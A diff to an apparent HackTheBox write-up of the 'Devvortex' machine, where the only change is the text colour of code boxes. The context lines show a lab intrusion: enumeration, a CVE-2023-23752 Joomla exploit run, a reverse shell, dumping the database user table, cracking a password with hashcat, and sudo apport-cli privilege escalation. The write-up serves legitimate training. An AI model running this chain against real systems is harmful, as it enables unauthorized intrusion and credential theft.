@@ -20,7 +20,7 @@ title: Devvortex (machine)
 
 <h2>Gobuster dir results</h2>
 
-<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px; color: black;">
 <p>gobuster dir -u http://devvortex.htb -w directory-list-2.3-small.txt -t 100</p>
 
 <p>===============================================================<br />
@@ -50,7 +50,7 @@ Finished<br />
 
 <h2>Gobuster vhost results</h2>
 
-<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px; color: black;">
 <p>gobuster vhost -u devvortex.htb -w subdomains-top1million-110000.txt -t 100 --append-domain<br />
 ===============================================================<br />
 Gobuster v3.6<br />
@@ -83,7 +83,7 @@ Finished<br />
 
 <h2>Gobuster dir results</h2>
 
-<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px; color: black;">
 <p>gobuster dir -u http://dev.devvortex.htb -w directory-list-2.3-small.txt -t 100&nbsp;&nbsp;&nbsp;<br />
 ===============================================================<br />
 Gobuster v3.6<br />
@@ -123,7 +123,7 @@ Starting gobuster in directory enumeration mode<br />
 
 <p>We are in a Joomla instance and it means that We can use <a href="https://www.kali.org/tools/joomscan/">joomscan</a>. Joomscan is a useful tool for joomla enumeration available in Kali Linux and I ever run it in this cases (It rarely fails in my analysis).</p>
 
-<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px; color: black;">
 <p>&nbsp;&nbsp;&nbsp; ____&nbsp; _____&nbsp; _____&nbsp; __&nbsp; __&nbsp; ___&nbsp;&nbsp; ___&nbsp;&nbsp;&nbsp; __&nbsp;&nbsp;&nbsp; _&nbsp; _<br />
 &nbsp;&nbsp; (_&nbsp; _)(&nbsp; _&nbsp; )(&nbsp; _&nbsp; )(&nbsp; \/&nbsp; )/ __) / __)&nbsp; /__\&nbsp; ( \( )<br />
 &nbsp; .-_)(&nbsp;&nbsp; )(_)(&nbsp; )(_)(&nbsp; )&nbsp;&nbsp;&nbsp; ( \__ \( (__&nbsp; /(__)\&nbsp; )&nbsp; (<br />
@@ -198,7 +198,7 @@ Your Report : reports/dev.devvortex.htb/&nbsp;</p>
 
 <p>We are running a joomla 4.2.6 instance, after some Google search I notice that a version before 4.2.8 is vulnerable to <a href="https://github.com/Acceis/exploit-CVE-2023-23752">CVE-2023-23752</a>. This GitHub repository provides a Ruby script to exploit the CVE.</p>
 
-<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px; color: black;">
 <p>ruby exploit.rb http://dev.devvortex.htb<br />
 Users<br />
 [649] lewis (lewis) - lewis@devvortex.htb - Super Users<br />
@@ -251,7 +251,7 @@ DB encryption 0</p>
 
 <p>To stabilize the shell We can use python as explained <a href="https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal">here</a>, then We can run systemctl status to see which services are running.</p>
 
-<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px; color: black;">
 <p>www-data@devvortex:/$ systemctl status<br />
 ● devvortex<br />
 &nbsp;&nbsp;&nbsp; State: running<br />
@@ -318,7 +318,7 @@ www-data@devvortex:/$</p>
 
 <p>We have a MySQL running service and, If you remember, joomscan has provided us the db credentials for lewis.</p>
 
-<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px; color: black;">
 <p>www-data@devvortex:/$ mysql -u lewis -p<br />
 Enter password:<br />
 Welcome to the MySQL monitor.&nbsp; Commands end with ; or \g.<br />
@@ -338,7 +338,7 @@ owners.</p>
 
 <p>Taking a look for the databases We notice that there is a <strong>joomla</strong> database. In this database the <strong>sd4fg_users</strong> table contains username and password columns:</p>
 
-<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px; color: black;">
 <p>mysql&gt; select username,password from sd4fg_users;<br />
 +--------------+--------------------------------------------------------------+<br />
 &nbsp;| username | password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />
@@ -353,7 +353,7 @@ owners.</p>
 
 <p>The password field is hashed, but this is an Easy HackTheBox Machine so We can try to crack it using hashcat.</p>
 
-<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px; color: black;">
 <p>Session..........: hashcat<br />
 Status...........: Cracked<br />
 Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))<br />
@@ -385,7 +385,7 @@ Stopped: Fri Dec 29 14:33:54 2023</p>
 
 <p>Logan is able to run apport-cli as sudo user and this is a Privilege escalation vector as explained <a href="https://github.com/advisories/GHSA-qgrc-7333-5cgx">here</a>.</p>
 
-<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px; color: black;">
 <p>logan@devvortex:/$ sudo /usr/bin/apport-cli -h<br />
 Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]</p>
 
